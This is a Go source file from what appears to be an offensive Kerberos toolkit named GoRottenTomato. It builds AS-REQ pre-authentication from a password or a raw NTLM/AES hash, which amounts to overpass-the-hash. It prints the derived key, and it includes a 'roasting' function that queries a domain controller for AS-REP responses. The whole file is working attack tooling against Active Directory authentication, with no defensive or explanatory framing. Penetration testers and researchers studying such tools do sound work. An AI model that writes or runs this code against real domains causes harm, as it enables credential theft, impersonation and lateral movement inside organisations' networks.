package AskTGT

import (
	"GoRottenTomato/asn1"
	"GoRottenTomato/krb5/KRBError"
	"GoRottenTomato/krb5/crypto"
	"GoRottenTomato/krb5/crypto/etype"
	"GoRottenTomato/krb5/flags"
	"GoRottenTomato/krb5/netWork"
	"GoRottenTomato/krb5/procedure"
	"GoRottenTomato/krb5/types"
	"encoding/hex"
	"fmt"
	"time"
)

//set PA Data for AS_REQ
func setPAData(krberr *KRBError.KRB_Error, asreq *procedure.AS_REQ, cname types.PrincipalName , password, hash, realm string, noPac bool, eTypeID int32) ( key types.EncryptionKey, err error) {
	//nopac == false ude pac else not
	kerbPaPacREQUEST, err := types.NewKerbPaPacREQUEST(noPac)
	if err != nil {
		return
	}
	asreq.Padata = []types.PA_DATA{
		*kerbPaPacREQUEST,
	}

	if krberr == nil {
		eType := crypto.GetEType(eTypeID)
		key, err = getEncryptionKey(eType, cname, password, hash, realm, nil)
		if err != nil {
			return key, fmt.Errorf("set PAData error because: %v", err)
		}
	}else {
		eType, e := getPreAuthenEType(krberr)
		if e != nil {
			err = e
			return
		}
		key, err = getEncryptionKey(eType, cname, password, hash, realm, krberr)
		if err != nil {
			return key, fmt.Errorf("set PAData error because: %v", err)
		}
	}

	fmt.Printf("[*]Starting PreAuthentication with %s hash: %s\n", crypto.GetETypeString(eTypeID), hex.EncodeToString(key.KeyValue))

	paTimeStamp, e := getPAEncTimeStamp()
	if e != nil {
		err = e
		return
	}

	paEncTimeStamp, e := crypto.GetEncryptedData(paTimeStamp, key, flags.AS_REQ_PA_ENC_TIMESTAMP, 1)
	if e != nil {
		err = e
		return
	}

	pb, e := paEncTimeStamp.Marshal()
	if e != nil {
		err = e
		return key, fmt.Errorf("time stamp marshaled error %v", err)
	}
	pa := types.PA_DATA{
		Padata_Type: flags.PA_ENC_TIMESTAMP,
		Padata_Value: pb,
	}
	asreq.Padata = append(asreq.Padata, pa)
	return
}

func getEncryptionKey(eType etype.EType, cname types.PrincipalName, password, hash, realm string, krberr *KRBError.KRB_Error) (types.EncryptionKey, error) {
	if password != "" {
		if krberr != nil && krberr.Error_Code == flags.KDC_ERR_PREAUTH_REQUIRED {
			var pas types.PADataSequence
			err := pas.Unmarshal(krberr.E_Data)
			if err != nil {
				return types.EncryptionKey{}, fmt.Errorf("getEncryptionKey failed %v", err)
			}
			key, err := crypto.GetEncryptionKeyFromPassword(password, realm, eType, cname, pas)
			return key, err
		}
		key, err := crypto.GetEncryptionKeyFromPassword(password, realm, eType, cname, types.PADataSequence{})
		return key, err
	} else if hash != "" {
		value, err := hex.DecodeString(hash)
		if err != nil {
			fmt.Println(err)
		}
		key := types.EncryptionKey{
			KeyType: eType.GetETypeID(),
			KeyValue: value,
		}
		return key, nil
	}else {
		return types.EncryptionKey{}, fmt.Errorf("please provide password or hash")
	}
}

func getPreAuthenEType(krberr *KRBError.KRB_Error) (eType etype.EType, err error) {
	var eTypeID int32
	var pas types.PADataSequence
	err = pas.Unmarshal(krberr.E_Data)
	if err != nil {
		return nil, err
	}
	for _, value := range pas{
		switch value.Padata_Type {
		case flags.PA_ETYPE_INFO2:
			info, e := value.GetETypeINFO2()
			if e != nil {
				err = e
				return
			}
			eTypeID = info[0].Etype
			break
		case flags.PA_ETYPE_INFO:
			info, e := value.GetETypeINFO()
			if e != nil {
				err = e
				return
			}
			eTypeID = info[0].Etype
		}
	}
	//use aes128 or aes 256 default rc4
	eType = crypto.GetEType(eTypeID)
	return
}

func getPAEncTimeStamp() ([]byte, error) {
	now := time.Now().UTC()
	pa := types.PA_ENC_TS_ENC{
		Patimestamp: now,
		Pausec: int((now.UnixNano() / int64(time.Microsecond)) - (now.Unix() * 1e6)),
	}
	data, err := asn1.Marshal(pa)
	if err != nil {
		return nil, fmt.Errorf("get pa data time stamp failed %v", err)
	}
	return data, nil
}

func getTGT(data []byte, key types.EncryptionKey) (*procedure.AS_REP, error) {
	var asrep procedure.AS_REP
	err := asrep.Unmarshal(data)
	if err != nil {
		return nil, err
	}
	err = asrep.DecryptEncPart(key)
	if err != nil {
		return nil, err
	}
	return &asrep, nil
}

func roasting(dcIP string, data []byte) (*procedure.AS_REP, error) {
	resp, err := netWork.SendToKDC(dcIP, data)
	if err != nil {
		return nil, err
	}
	var asrep procedure.AS_REP
	err = asrep.Unmarshal(resp)
	if err != nil {
		return nil, err
	}
	return &asrep, nil
}